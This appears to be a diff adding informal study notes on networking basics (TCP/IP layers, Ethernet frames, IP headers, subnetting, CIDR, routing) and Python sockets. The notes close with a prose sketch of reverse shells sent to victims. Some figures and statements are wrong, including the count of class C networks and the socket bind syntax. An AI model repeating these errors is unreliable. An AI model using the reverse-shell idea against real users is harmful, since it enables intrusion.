@@ -1,0 +1,773 @@
+NAT (Network Address Translation)->
+NAT is used in routers, it's purpose is to translate a set of IP addresses to a another set of IP addresses
+NAT helps in preserve the limited amount of IP4 public IP addresses
+Routers provide the private IP addresses to the devices in network and when devices wants to interact with the internet, then our private IP
+address for the device will be translated by NAT to the public IP address
+So NAT translates from private to public and also from public to private, as if the internet wants to interact with the computer on private
+network then the public IP address needs to translated by NAT to private IP address of that computer
+In the future we won't need NAT or private IP address bcz of IP6, bcz with IP6 every device in the world will have it's own public IP address
+
+Protocol -> a define set of standards that computer must follow in order to communicate properly
+
+TCP/IP 5 layer Model->
+1) Physical Layer -> It represents the physical devices that interconnect computers
+2) Data Link Layer(Network Interface or Network Access Layer) -> at this layer we introduce our 1st protocols, It is responsible for defining a
+common way of interpreting signals so network devices can communicate
+The Ethernet standards also define a protocol responsible for getting data to nodes on the same network or link
+3) Network Layer (Internet layer) -> this layer allows different networks to communicate with each other through devices known as routers
+- A collection of networks connected together through routers, the most famous of these being the internet
+The Data link layer is responsible for getting data across a single link while a network layer is responsible for getting data deliver across
+a collection of networks
+- Most common Protocol for Network layer is IP
+Network software is usually divided among the client and server categories, with the client application initiating the request for data and the
+server software answering for the request across the network
+A single node may be running multiple client and server applications
+So u might run an email program and a web browser both client application on ur PC at the same time, and ur email and web server might both
+run on the same server even so emails end up in ur email applications and web pages end up in ur web browser that's bcz of transport layer
+4) Transport layer -> while the network layer delivers data between 2 individual nodes the transport layer sorts out that which client and
+server programs r supposed to get that data
+Protocol most commonly used in the 4th layer is TCP(Transmission control Protocol)
+Other transport Protocols also use IP to get around, including a Protocol known as UDP(User Datagram Protocol)
+TCP provides mechanisms that data reliably deliver while UDP does not
+Network layer is in this case is IP which is responsible to get data from one node to another
+Transport layer mostly TCP and UDP is responsible for ensuring that data gets to the right application running on those nodes
+5) Application Layer -> Protocols used to allow u to browse the web, or send or receive email are come common ones used in this layer
+
+We can think of 5 layers like this
+Physical layer is the delivery truck and the roads ,data link layer is how the delivery truck gets from one intersection of road to another,
+the network layer identifies which roads to be taken to get from address A to address B, transport layer tells that the delivery driver knows
+how to knock on ur door for ur package and the application layer is the contents of the package it self
+
+The basis of Networking devices cables ->
+Cables -> they connect different devices to each other, allowing data to be transmitted over them, most network cables can be split in two
+ categories copper and fibre , Copper cables r most common, the sending device communicates binary data across these copper wires by changing
+ the voltage between two ranges, the system at the receiving end interpret these voltage changes as binary 1's and 0's
+ The most common forms of copper twisted pair cables used in networking are Cat5, Cat5e and Cat6 cables, these category twisted pairs are
+  arranged to define the types of usable links and transfer rates
+Car 5e is better then cat 5 bcz it's internals reduce crosstalk(when an electrical pulse on one wire is accidentally detected on another wire)
+bcz of which the receiving end does not understand data causing a network error
+
+Their are higher level protocols which have methods for detecting missing data and asking for the data second time
+cat 6 is better then cat 5e in many aspects except they have a shorter maximum distance when used at higher speed
+
+Fibre -> contains individual optical fibres which r tiny tubes made out of glass about the width of human hair
+Fibre cables uses pulses of light to represent the 1's and 0's of the underlying data
+Fibres r used in areas where r many elector magnetic disturbances and they r also more faster at more distances with out potential data loss
+ then cables
+
+ Hubs and Switches ->
+ cables allow u to form point ot point network connections, these r networks where only single device at each end exists.
+
+ Hub -> it is a physical layer device that allows for connections from many computers at once
+ all the devices connected to Hub will end up taking to all other devices at the same time, it's upto each system connected to the Hub to
+  determine that the incoming data is meant for them or to ignore it this cases lots of noise create on the network and called collision domain
+
+  Collision domain -> a network segment where only one device can communicate at a time, if multiple systems try sending data at the same time
+  , the electrical pulses sent across the cable can interfere with each other, this makes the system to wait for the required period and this
+  leads to slow down of network communications and this is the primary reasons why the Hubs r rare and historical artifact today
+
+  In Switch u can connect many devices to it so that they can communicate, the difference in the the Hub is a physical layer device while a
+  switch is a layer 2(Data Link) device, this means the switch can actually inspect the contents of the ethernet protocol data being sent around the
+  network determine which system the data is intended for and then only send that data to that one system, these reduces the size of collision
+  domain on the network which leads to less re-transmissions and high through put
+
+  Routers ->
+  The hubs and switches are the primary devices used to connect computers on a single network, usually referred to as LAN but we often wanna
+  send the data to other networks here routers come in.
+  Router is a device that knows how to forward data between independent networks
+  Router operates at layer 3 (Network layer)
+  Just like a switch can inspect ethernet data to determine where to send it a router can inspect IP data to determine where to send things
+
+  Router store internal tables containing information about how to route traffic between lots of different networks all over the world
+  The most common type of routers u see r in home network or small office these devices generally don't have detailed routing tables, the
+  purpose of these routers is generally to take traffic originating from inside the home or office to LAN is to forward it to ISP
+  Once traffic is at the ISP more sophisticated router takes over and these core routers form the backbone of the internet
+
+  Core routers usually have many different connections to many other routers
+
+  BGP(Border Gateway Protocol) -> Routers share data with each other via this protocol, which lets them learn about the most optimal paths to
+  forward traffic
+  - Routers are kind of global guides to get to right places
+
+  Servers and Clients ->
+  All the network devices exists to communicate with each other, we call these devices 'nodes'
+  Servers could be understand simply as the something will provides data to something which requests those data and the thing receiving that
+  data is referred to as Clients, we referer something in above definition bcz it's not just nodes which can be servers or clients, individual
+  computer programs running on the same node can be servers and clients to each other
+  So most devices are not servers and clients, almost all nodes are both at the some time
+  In most network topologies each node is primarily is server or a client , sometimes we refer email server as an email server even though it
+  itself is a client of a DNS server bcz its primary reason for existing is to server data to it's client likewise if a desktop machine
+  occasionally access a server and sends that to another computer it's primary reason for existing is to fetch data from servers so that the
+  user at the computer can do the work
+  So server is anything that provide a data to a client
+
+  Physical Layer ->
+  It's main focus is to move 1's and 0's from one end of the link to the next
+  The physical layer consist of devices and means of transmitting bits across computer networks
+  A bit is the smallest representation of data that a computer can understand, it's a one or a zero
+  Modulation is a way of varying the voltage of this charge moving across the copper cable
+  In Computer Networks this kinds of modulation is commonly called Line Coding, it allows devices on either end of the link to understand the
+  electrical charge in certain state is 0 and in another state is 1
+
+  Twisted Pair Cabling and Duplexing -> these twisted pair of copper cables allow for Duplex communication
+  Duplex communication is the concept that information can flow in both the directions across the cable
+  Simplex communication is unidirectional
+  The Duplexing communication is possible by reserving one or two pairs for communicating in one direction they then use the other pairs for
+  communicating in other direction
+  If their is something wrong with the connection u might see network link degrade and reporting it self as Half duplex, means the communication
+  is possible in each direction but only one device can be communicating at a time
+
+  Network Ports and Patch Panels ->
+  the final steps of how the physical layer works takes place is at the endpoints of our network links , the twisted pair of the cables end up
+  with a plug , the most common plug is the "RJ45", So RJ45 plug can connect to RJ45 network port
+  Network ports r generally directly attached to the devices that make up a computer network
+  Switches would have many network ports bcz their purpose is to connect many network devices, but servers and desktops have usually one or two
+  Sometimes ur computer will not directly linked to ports as they as first connected to patch panels, Patch Panel is a device containing many
+  network ports that's it, it's just a container for the end points or many cables additional cables r generally run from patch panel to
+  switches and routers to provide network access to the computers to the other ends of those links
+
+  The Data Link Layer ->
+  Ethernet and Mac addresses -> The Protocol most widely used to send data across individual links is Ethernet, Ethernet and Data link layer
+  provides means for software at the higher level stack to send and receive data, one of the primary purposes of this layer is to abstract away
+  the need for any other layers to care about the physical layers and what hardware is in use, by dumping this responsibility on the Data link
+  layer the Network, Transport and Application layers can all operate the same no matter how the device they r running on is connected
+  Such as ur Web browser doesn't need to know it is running on twisted pair or fibre etc, it just needs the underlying layer to send and receive
+  data for it
+
+  CSMA/CD -> Used to determine when the communication channels are clear and when the device is free to transmit data, it works like this
+  if their is no data currently being transmitted on the network segment a node will feel free to send data, if it turns out that the two or
+  more computers end up transmitting data at the same time, the computers detect this collision and stop sending data, each device involved in
+  the collision then will be waiting random interval of time before trying to send data again, this random interval will help all the computers
+  involved in the collision from colliding again next time when they try to transmit any thing
+  When a network segment is a collision domain it means that all devices on that segment receive all communication across the entire segment
+  this means we need a way to determine which node the transmission was actually meant for, this is known as Media access control address or
+  MAC address
+  MAC Address -> it is globally unique identifier attached to an individual network interface, it's a 48bit no. normally represented by 6
+  groupings of two hexadecimal numbers
+  A MAC address is split in two sections
+  the first 3 octets of MAC address r known a OUI(Organizationally Unique Identifier) these r assigned to individual hardware manufactures by
+  the IEEE, the last three octes of the MAC address can be assigned in any way the manufacturer would like with the condition that they only
+  assign each possible address once to keep all MAC addresses globally unique
+
+  Ethernet uses MAC addresses to ensure that the data it sends has both an address for the machine that sent the transmission as well as the
+  one the transmission was intended for
+  This way even the network segment acting as a single collision domain, each node on that network knows when traffic is intended for it
+
+  Unicast, Multicast and Broadcast ->
+  Transmit data from one device to another device is known as Unicast, A unicast transmission is always meant for just one receiving address
+  At the ethernet level this done by looking at special bit in the destination MAC address
+  If the least significant bit in the first octet of a destination address is set to zero, it means that ethernet frame is intended for only
+  the destination address
+  This means it will send to all devices on the collision domain but actually received and process by the intended destination
+  If the least significant bit in the first octet of a destination address is set to one, it means u r dealing with multicast frame
+  in multicast frame is similarly set to all devices on the local network segment and it will be accepted and discarded by each device depending
+  on criteria aside from their own hardware mac address
+
+  Network interfaces can be configured to accept lists of configured multicast addresses for these sorts of communication
+
+  the third type of ethernet transmissions is known as broadcast, in ethernet broadcast it sends it to every single device on a LAN, this is
+  accomplished by using a special destination known as Broadcast address
+
+  the Ethernet broadcast address is all FF:FF:FF:FF:FF:FF
+
+  Ethernet broadcast r used so that the devices can learn more about each other
+
+  Dissecting an Ethernet Frame ->
+  Data Packet -> is an all-encompassing term that represents any single set of binary data being sent across a network link
+  The term Data-packet isn't tied up with any layer or technology, it just represents a concept as one set of Data sent from point a to point b
+
+  Data-Packets at the ethernet level r known as Ethernet Frames
+  Ethernet Frame is a highly structured collection of information presented in specific order, this way the network interfaces at the physical
+  layer can convert a stream of bits travelling across a link into meaning full data or vice-versa
+  Almost all sections of a ethernet frame are mandatory and most of them have a fix size
+
+  The First part of Ethernet Frame is known as Preamble, it is 8 bytes long and can itself be split into two sections, the 1st 7 bytes r
+  alternating series if 1's and 0's, these act partially as buffer between frames and can also be used by the network interfaces to synchronize
+  internal clocks they use to regulate the speed at which they send data and the last byte in Preamble is known as SFD
+  SFD(Start Frame Delimiter) -> It signals to a receiving device that the preamble is over and the actual frame contents will now follow
+
+  The Second part is the Destination Mac Address, this is the hardware address of the intended recipient, it is 6 bytes long
+
+  The Third part is Source Address, it is 6 bytes long, it is the place from where the frame is originated from
+
+  The Fourth Part is VLAN header , it is 4 bytes long, it indicates that the frame itself is called VLAN's frame, If a VLAN header is present
+  the ethertype field follows it
+  VLAN(Virtual LAN) -> It's a technique that lets u have multiple logical LAN's operating on the same physical equipment
+
+  Any frame with the VLAN tag will only be delivered out of a switch interface configured to relay that specific tag, this way u can have a
+  single physical network that operates like it's multiple LAN's
+  VLAN's r usually used to segregate different forms of traffic
+  So u might see a companies IP phones operatic on one VLAN while all desktops operating on another
+
+    The Fifth Part is Ethernet Type , it is 2 bytes long, it is used to describe the protocol of the contents of the frame
+
+  The Sixth part is Data Payload, it ranges from 0-1500 bytes
+  A Payload in networking term which is the actual data being transported, which is everything that isn't a header
+  The data payload of a traditional ethernet frame can be any where from 46 - 1500 bytes long, this contains all of the data from higher layers
+  such as the Network, transport and application layers that actually being transmitted
+
+  The Seventh and last part is the FCS(Frame Check Sequence), it is 4 bytes long, it represents the checksum value for entire frame
+  This checksum value is calculated by performing what's known as a cyclical redundancy check against the frame
+  cyclical redundancy check(CRC) is an important concept for data integrity and is used all over computing, not just network transmissions
+  CRC is a mathematical transformation to create a no. that is larger set of data, any time u perform a CRC against a set of data u should end
+  up with the same checksum no.
+  The reason it is included in the ethernet frame is so the receiving network interface can conform that if it receives uncorrupted data
+  When a device gets ready for the sending the ethernet frame, it collects all the information like the destination and originating MAC address
+  ,the data payload and so on. then it performs a CRC against that data and attach's the resulting checksum no. as the Frame check Sequence
+  at the end of the frame this data is then send across a link and received at the other end
+  Here all the various fields of the ethernet frame r collected and now the receiving side performs a CRC against that data, if the checksum
+  computed by the receiving end doesn't match the checksum in FCS field the data is thrown out, this is bcz some amount of data must have been
+  lost or corrupted during transmission, it's then out to a protocol of a higher layer to decide that data should be retransmitted
+  Ethernet itself only reports on the data integrity, it doesn't perform data recovery
+
+  Network Layer ->
+  On a LAN nodes can communicate with each other through their physical MAC addresses, this is suitable for small scale bcz switches can learn
+  MAC addresses connected to each of the Ports to forward transmissions appropriately, every single Network interface has a unique MAC address
+  and they are not ordered in any form of systematic way, their is no way of knowing where in the planet a certain MAC address might be at
+  any one point in time, so it's not ideal for communication across distances
+
+  IP Address -> IP addresses r 32 bit long no. made of 4 octets, IP addresses r distributed in large sections to various organizations and
+  companies instead of determined by Hardware vendors, this means the IP addresses r more hierarchical and easier to store data about then
+  the physical addresses
+  Think about IBM which owns every single IP that has no. 9 as it's 1st octet, at high level this means if the internet router needs to figure
+  out where to send a data packet intended for the IP address 9.0.0.1 that router has get to know only one of IBM's router that router handle
+  rest of the delivery process from their
+  IP addresses belong to networks not to the devices attached to those networks, So ur laptop will always have the same MAC address no matter
+  where u use it but it will have different IP addresses signed to it in the Internet cafe then it would when u r home.
+  The LAN in internet cafe or at ur house will each be individually responsible for handing out an IP address to ur laptop.
+
+  On many modern networks u can connect a new device and an IP address will be assign to it automatically, through a technology known as
+  DHCP(Dynamic Host Configuration Protocol) the IP address assigned this way is known as Dynamic IP address, While Static IP address must be
+  configured on a Node manually.
+
+  In most cases static IP addresses r reserved for servers and network devices while dynamic IP addresses r reserved for clients but their r
+  certainly situations where this might not be true
+
+  IP Datagrams and Encapsulation -> Just like all the data packets at the ethernet layer have a specific name ethernet frames, So do packets at
+  the network layer under the IP protocol a packet is usually refer to IP datagram
+  An IP datagram is a highly structured series of fields that r strictly defined
+  The two primary sections of a IP datagram r the Header and the Payload, IP datagram header contains a lot more data then ethernet data frame
+  does
+  1st field (Version) is 4 bits and indeicates what version of internet protocol is used, The most common version of IP is version 4(IPv4)
+  2nd field (Header Length) is 4 bits and declares how long the header is, it is almost always 20 bytes in length when dealing with IP4 infact
+  20 bytes is the minimum length of IP header u couldn't fit all the data u need for a properly formatted IP header in any less space
+  3rd field (Service TypeField) these 8 bits can be used to specify details about quality of service or QoS technologies
+  Their r services that allow routers to make decisions about which IP datagram may be more important then others
+  4th field (Total Length) is 16 bit field, it indicates the total length of the IP datagram it's attached to
+  5 th field (Identification Field) it is 16 bit number used to group msgs together
+  The maximum size of a simgle datagram is the largest datagram u can represent with 16 bits:65,535, If the total amount of data that needs to
+  be sent is larger than what can fit in a single datagram, the IP layer needs to split this data up into many individual packets and when this
+  happens the Identification field is used so that the receiving end understands that every packet with the same value in that field is part of
+  the same transmission
+  6 th and 7th fields r Flags Field and Fragment Offset Field, the Flag field is used to indeicate if a datagram is allowed to be fragmented,
+  or to indicate that the datagram is already been fragmented
+  Fragmentation is the process of taking a single IP datagram and splitting it up into several smaller datagrams
+  Well most netwroks operate with similar settings in terms of what size an IP datagram is allowed to be sometimes this could be configured
+  differently, if a datagram has to cross from a netwrok allowing a larger datagram size to one with a smaller datagram size, the datagram have
+  to be fragmented into smaller ones
+  the Fragment offset field contains values used by the receiving end to take all the parts from a fragmented packet and put them back together
+  in a correct order
+  8th field(TTL) it is an 8 bit field that indicates how many router hops a datagram can traverse before it's thrown away
+  Every time a datagram reaches a new router, that router decrements the TTL field by 1, once this value reaches 0, a router knows it doesn't
+  have to forward datagram any further
+  The main purpose of this field is to make sure that when their is misconfiguration in routing that causes and endless loop, datagrams don't
+  spend all iternity trying to reach the destination.
+  THis endless loop could be when router 'a' thinks router 'b' is the next hop and router 'b' thinks router 'a' is the next hop
+  9th field (Protocol) it is an 8 bit field that contains data about what transport layer protocol is being used
+  THe most common transport layer protocols are TCP and UDP
+  10th field (Header checksum) this field is the checksum of the contents of the entire IP datagram header, it functions very much like the
+  ethernet checksum field
+  Since the TTL field has to be recomputed at every router that a datagram touches, the checksum field necessary changes too
+  11th and 12th fields the Source IP Address and Destination IP Address
+  13th field (Options field) it is an optional field and is used to set special characteristics for datagram primarily used for testing purposes
+  the Options field is usally followed by Padding field, Since the options field is both optional and variable in length, the Padding field is
+  a series of zeros used to ensure the header is the correct total size
+  Ip datagram is the Data Payload section and this process is known as Encapsulation
+  THe entire contents of the IP datagram r encapsulated as the payload of ethernet frame
+  THe IP datagram also has a payload section, the contents of this payload r entirity of TCP or UDP packet
+  Ech layer in Netwroking is needed by the one above it
+
+  The IP Address Classes ->
+  The IP addresses can be spit into two sections the netwrok ID and the host ID
+  Ex -> 9.100.100.100 , the network id will be the first octect '9' here and other 3 octets will come in Host ID
+  Address Class System -> A way of defining how the global IP address space is split up
+  their r 3 primary types of address classes ->
+  - Class A -> these r those where the 1st octet is used for the netwrok ID and the last 3 r used for the Host ID
+  - Class B -> these r where 1st two octets r used for the netwrok ID and the last 2 used for the host ID
+  - Class C -> these r where 1st three octets r used for the netwrok ID and the last one used for the host ID
+
+  Each Address class represent netwrok of vastly different size, range and max hosts no.'s .
+  We can identify the class of IP by looking at the range chart for each class
+  the chart also translate ncely how these addresses r represented in dotted decimal notation, as u remember each octet in IP address is 8 bits
+  which means each octet can take value between 0 and 255, If 1st bit has to be a 0 as it is with class A address, the possible values for the
+  first octet is from 0-127 and go on for other class types of IP
+  Class D addresses always begin bit the bites 1110 and r used for multicasting which is how a single IP datagram can be sent to an entire netwrok
+  a once, these addresses began with decimal values between 224-239
+  Class E addresses make up all of the remaining IP addresses but they r unassigned and only used for testing putposes
+  This class system has mostly being replaced by an sytem known as CIDR(Classless inter-domain routing)
+
+  Address Resolution Protocol -> It is a protocol used to discover the hardware address of a node with a certain IP address, Once an IP datagram
+  has being fully formed it needs to be encapsulated inside the ethernet frame, this means the transmission device needs a destination MAC
+  address to complete the ethernet frame header
+  Almost all netwrok connected devicecs will retain a local ARP table
+  ARP table -> it is just a list of IP addresses and the MAC addresses associated with them
+
+  lets say we wants to send some data from Host 'A' to IP address 10.20.30.40, their might we the case that this destination doesn't have an entry
+  in the ARP table when this happens the node that wants to send data, sends a broadcast(FF:FF:FF:FF:FF:FF) ARP msg to the MAC broadcast address
+  which is all FF's, these ARP msgs will be delivered to all computers on the local Netwrok when the netwrok interface that has been assigned
+  10.20.30.40 receives this ARP broadcast it sends back an ARP response this response msg will contain the MAC address for the Netwrok interfacing
+  . Now the transmitting computer knows what MAC address to put in the destination hardware address field and the ethernet frame is ready
+  for delivery, It will also likey store this IP address in it's local ARP table so it won't have to send that local ARP broadcast next time it
+  needs to communicate with this IP
+
+  ARP table entries generally expire after a short amount of time to ensure changes in the netwrok r accounted for
+
+  Subnetting ->
+  It is the process of taking a large netwrok and splitting it up into many individual and smaller subnetworks, or subnets
+
+  Incorrect subnetting setups are a common problem u might run into as an IT support Specialist, so it's important to have a strong
+  understanding of how it works
+
+  Address classes give us a way to break a total global IP space into discreat netwroks, If u wanna communicate with IP address 9.100.100.100
+  core routers on the internet will know that this IP belongs to the 9.0.0.0 class A netwrok, they then route the msg to the gateway router
+  responsible for the netwrok by looking at the netwrok ID
+  A gateway router specifically serves as the entry and the exit path to a certain netwrok, once ur packet gets to the gateway router to the
+  9.0.0.0 class A netwrok that router is now respinsible for getting that data to the proper system by looking at the host ID
+  With Subnets u can spilt ur large netwroks up into many smaller one's, these individual subnets will have their own gateway routers serving as
+  the ingress and egress point for each subnet
+
+  Subnet masks ->
+  In subnetting some bits that will normally comprise the Host ID r actually used for the subet ID with all 3 of these ID's(Subnet, Host , Netwrok)
+  reperesentable by single IP address, will know have a single 32 bit no. that can be acuratly delivered across many different netwroks.
+
+  At the internet level core routers only care about the network ID and use this to send the Datagram along to the appropriate gateway router
+  of that neterok, that gateway router then has some additional inforamtion that it can use to send the datagram along to the destination
+  machine or the next router in the path to get their, Finally the host ID is used by that last router to deliver the datagram to the intented
+  receipent machine. Subnet ID's r calculated via known as subnet mask
+
+  Subnet masks r 32 bit numbers that r normally written out as 4 octets in decimal
+  We can compare one subnet mask to an IP address to understand
+
+  We have IP address as -> 9    .    100    .     100   .     100
+  IP in binary ->     0000 1001 . 0110 0100 . 0110 0100 . 0110 0100
+  Subnet Mask  ->     1111 1111 . 1111 1111 . 1111 1111 . 0000 0000 // subnet mask is a binary no. that has 2 sections just the last octet contains 0's
+
+
+subnet mask which has part of the no. all the 1's tells us what we can ignore when computing a host ID and the part with 0's tells us what to keep
+
+we here r using the common subnet mask 255.255.255.0 the part that all 1's is to tell a router what part of an IP address is the subnet ID
+
+we know that 9.100.100.100 is a class A netwrok so 9 is the first octect and we will here use last 3 octets, the no's which have corresponding
+1's in the subnet mask are the subnet ID the no.'s in the remaing octet which has corresponding 0's r the host ID, the size of the subnet is
+entirely decided by it's subnet mask
+So for Example with a subnet mask of 255.255.255.0 here we know the last octet with 0 is remaing for host ID's regardless of what netwrok or
+subnet ID's are
+
+A single 8 bit no. can represent 256 different numbers, or more specifically the numbers 0-255, but 0 is normally not used and 255 is normally
+reserved as a broadcast address for the subnet this means that only the no.'s form 1 to 254  r available for assignment to a host
+Genrally speaking ur referred to the no. of host available in a subnet is the entire no.
+
+So even if that is understood  two addresses with 0 and 255 r not available for assignmnet u still say that 8 bits host ID space has 256 address
+available not 254 this is bcz those other IP's r still IP addresses even if they r not assigned directly to a node on that subnet
+
+The subnet mask 255.255.255.224 will translate to 1111 1111.1111 1111.1111 1111.1110 0000 this means that we have 5 bit's of host ID space or a
+total of 32 addresses
+
+Now if we r dealing with 9.100.100.100 with subnet mask of 255.255.255.224 now this subnet mask represents 27 of 1's followed by 5 of 0's a
+quicker way of referrencing this is with the notation /27 the entire IP and subnet mask could be written now as -> 9.100.100.100/27
+
+In general a subnet can usually only contain 2 less then the total no. of Host ID's available
+
+Basic Binary Math ->
+Binary and Base two r same
+
+If u have 8 bit no. u can perform as 2**8(2 to the power 8) = 256, So it shows that a 8 bit no. can represent 256 decimal no. or from 0 to 255
+in the same way If u have 4 bit no. u can perform as 2**4 = 16, So it shows that a 4 bit no. can represent 16 decimal no. as it goes on with
+If u have 16 bit no. u can perform as 2**16 = 65536, So it shows that a 16 bit no. can represent 65536 decimal no.
+
+So we represent binary as base 2 and decimal as base 10
+
+Ex -> lets take a base 10 no. with two columns of digits -> 00 00 and this will translate to 10**2 =100 which makes it now -> 99 99
+Similarly for base 10 no. with 3 columns of digits -> 00 00 00 and this will translate to 10**3=1000 which makes it now -> 999 999 999
+
+0+0 -> 0
+0+1 -> 1
+1+0 -> 1
+1+1 -> 10
+
+Two most important operators r AND & OR and 1 represents true and 0 represents false
+
+Subnet Mask is a way for a computer to use AND operators to determine if an IP address exists on the same Network, this means the host id portion
+is also known since their will be anything leftout
+
+We have IP address as -> 9    .    100    .     100   .     100
+  IP in binary ->     0000 1001 . 0110 0100 . 0110 0100 . 0110 0100
+  Operation to Perform  AND         AND         AND         AND
+  Subnet Mask  ->     1111 1111 . 1111 1111 . 1111 1111 . 0000 0000 // this is binary for 255.255.255.0
+  Result       ->     0000 1001 . 0110 0100 . 0110 0100 . 0000 0000 // the Result would be the Netwrok ID and subnet ID of our portion which is
+                        9       .   100    .    100    .    0
+  The computer that just performed this operation can now compare the results with it's own Netwrok ID to determine that is the address is on
+  the same netwrok or different one
+
+CIDR -> Address classes were the first attempt in splitting up the global internet IP space, subnetting was introduced when it was realized
+that the address classes r not an efficient way for keeping classes organized but as the internet grows the traditional sunetting just couldn't
+keep up
+With Trational subnetting and address classes the Network ID is always either 8 bit for class A netwroks, 16 bit for class B netwroks ,24 bits
+for class C networks
+This means that their might only be 254 class A netwroks in existance but it also means that their r around 297 million potential class C netwroks
+
+The Sizing of these networks are not always appropriate for the needs of most buissness
+
+So 254 hosts for class C is too small and 65534 of class B is too large , so many companies ended up with various adjoining class c netwroks to
+meat their needs that means the rounting table ended up with bunch of entries for bunch of class c netwroks that r all actually being routed
+with the same place this is where CIDR comes into play
+
+CIDR is more approriate approach for descibing blocks of IP addresses, it expands on the conecpt of subnetting by using subnet masks to demarcate
+netwroks
+
+To Demarcate something means to set something off
+Demarcation point -> To describe where one netwrok or system ends and another one begins
+
+In previuos model we relied on Network ID, Subnet ID and Host ID to deliver an IP datagram to the correct location with CIDR the Netrok ID and
+subnet ID r combined into one CIDR is where we get this '/27' kind of notation which is also known as CIDR notation
+CIDR basically abondans the conecpt of address classes entirely allowing an address to be defined by only two individual ID's
+
+Lets take IP address as -> 9    .    100    .     100   .     100
+           Subnet Mask  ->255   .    255    .     255   .       0   // this can also be written as 9.100.100.10/24
+  In the world in which we donot care about the address class of IP all we need is what the Netwrok mask tells to determine the network ID in this
+  case that would be 9.100.100 as the Host ID remains the same
+
+  Before this netwrok sizes were static based on class A, B, C and only subnets can be of different sizes while CIDR allows for netwroks themselves
+  to be in different sizes before this if a company needed more addresses then a single class c can provide they need an entire 2nd class c but
+  with CIDR they can combine that address space into one contigous chunk with a netmask of /23 or 255.255.254.0 this means that the router now
+  only need to know one entry in the routing table to deliver traffic to these address instead of two
+
+  It also important that u get additional available host ID's out of this practice, rember that u always lose 2 host ID's per netwrok So if a
+  /24 network is 8 host bits means 2**8 = 256 then u only have 256 - 2 = 254 available IP's to assign
+  If u need 2 netwroks of this size then u have 254+254 = 508 hosts
+  a single /23 netwrok is 9 host bits means 2**9 = 512 and hten 512 - 2 =510 hosts
+
+  Basic Routing Concepts ->
+  A router is network device that forwards traffic depending on the destination address of that traffic, Router is device that has atleast two
+  netwrok interfaces since it has to be connected to 2 netwoks to do it's job
+
+  Basic Routing Steps ->
+  1) A router receives a packet of data on one of it's interfaces
+  2) Router examins the destination IP of this packet
+  3) THe router then Looks up the IP destination netwrok in it's routing table
+  4) the router forwards that out through the interface that's closest to the remote netwrok as determined by the additional info in the
+     routing table
+  5) these steps r repeated often until traffic reaches it's destination
+
+  Let's assume that the router is connected to two networks 1st Netwrok 'A' have an address space of 192.168.1.0/24 and 2nd netwrok 'B' which has
+  an address space of 10.0.0.0/24 and the router has interface on each network, on netwrok A it has IP of 192.168.1.1 and on netwrok B it has
+  an IP of 10.0.0.254 remember IP address belongs to netroks not individual nodes on the netwrok a computer on Netwrok A with IP address of
+  192.168.1.100 sends a packet to the address 10.0.0.10 and this computer knows that 10.0.0.10 is it in it's local subnet, So it sends this
+  packet to the MAC address of it's gateway the router.
+
+  The Routers Interface On Netwrok A recives the packet bcz it sees that destination MAC address belongs to it, the rooter strips away the data
+  link layer encapsulation by removing ethernet header and ethernet footer and leaving only the netwrok layer contents the IP datagram, now the
+  router can directly Inspect the IP datagram Header for the destination IP field, it finds the destination IP as 10.0.0.10 then router looks
+  at it's routing table and sees that netwrok B or 10.0.0.0/24 network is the correct netwrok for the destination IP, it also sees that this
+  netwrok is only one HOP away infect since it's directly connected the router even has the MAC address for this IP in it's ARP table.
+  Next a router needs to form a new packet to forward along to netwrok B, it takes all of the data from it's 1st IP datagram and duplicates it
+  but it decrements the TTL field by and claculates a new checksum then it encapsulates this new IP datagram inside of a new ethernet frame
+  this time it sets it's own MAC adress on the inerface of Network B as the source MAC address, Since it has the MAC address of 10.0.0.10 in
+  it's ARP table it sets that as the destination MAC address and lastly the packet is send to it's destination netwrok (Netwrok B) and the
+  data finally gets delivered to the node living at 10.0.0.10
+
+  Now lets introduce a New netwrok in above scenerio
+
+  The third netwrok with the address apace of 172.16.1.0/23 and a second router connected netwrok B and new netwrok C it's interface on netwrok B
+  has IP 10.0.0.1 and it's interface on netwrok C has an IP of 171.16.1.1 this time around our computer at 192.168.1.100 wants to send some
+  data that has an IP of 172.16.1.100 here we r skipping the Data link layer process like above but remember it is still happening the computer
+  at 192.168.1.100 knows that computer 172.16.1.100 is not on it's local netwrok, So it sends the packet to it's gateway the Router between
+  netwrok A and netwrok B , again the Router inspects yhe content of this packet it sees the destination address of 172.16.1.100 and then
+  lookup through it's routing table, it knows that quickest way to 172.16.1.0 /23 netwrok is being at another router
+
+
+Python Networking ->
+
+@ -> https://www.youtube.com/watch?v=E3YcCawV-0s&index=16&list=PLhTjy8cBISErYuLZUvVOYsR1giva2payF
+
+Public IP address r provided by the ISP's or Wi-Fi Ex - on google type -> whats my ip // to know ur public IP address
+Private IP address r provided by the router, Ex -> on terminal type ifconfig or ipconfig // to know ur private IP address
+
+Static IP address do not change while the Dynamic IP address always keep changing
+Static IP Ex -> Servers and Websites    // this IP will not change unless u r accessing from same place bcz such as if u shift from US to India
+                                           then u will be interacting with different server of the same website
+Dynamic IP Ex -> Computer and Mobile Devices
+
+windows terminal -> netstat -a -b -n // only with administrator privileges on entering the following cmd u get the list of all IP addresses with
+                                        ports
+We can understand it like this way as IP address as street and port no. as house on the street
+
+Some Protocols have definate Port No.
+HTTP    - 80
+FTP     - 20
+SMTP    - 25
+NNTP    - 119
+POP3    - 110
+
+List of Well Known TCP port No. -> https://www.webopedia.com/quick_ref/portnumbers.asp
+
+U can enter the port no. with protocols Ex -> on browser type 'google.com:80' in URL u will see that the google is open but if u type in the
+browser 'google.com:20' u will get the error msg as port no. 20 is for FTP
+
+Sockets r required for one computer to another computer by binding the port and IP address together
+Socket cmds in python ->
+socket.socket()             // this creates a socket
+s.bind(host,port)           // to bind the ip and port to the socket , IP is also known as host
+s.send()                    // to send a msg
+s.listen()                  // to listen a msg
+s.recv()                    // after receiving msg decode the msg into its system
+s.close()                   // close the socket
+
+Direct Connections -> remotely connect to computer using cmd shell or terminal , for this u first create a socket on ur own computer and then
+send a request to another computer IP address
+
+Problems with Direct Connection ->
+- It is difficult to get the IP of another computer
+- Even If we get the IP address, the IP will we dynamic IP so its always changing
+- Even if we get regular updates of Dynamic IP still the computer has bunch of firewalls which prevents these type of connections to happen,
+  which makes impossible for us to get into another computer
+
+Reverse Connections -> In this the connection is initiated from the victim's computer, So in this the hackers create a python file called
+reverse shell in which the hackers IP and Port is stored and then send this file to victim, and when victim opens this file it creates a reverse
+connection to the hackers computer
+So now the hacker doesn't have to worry about the IP of the victim's computer
+But still their is one problem the hackers computer still has a Dynamic IP, so the address stored in the file will we use less after some time,
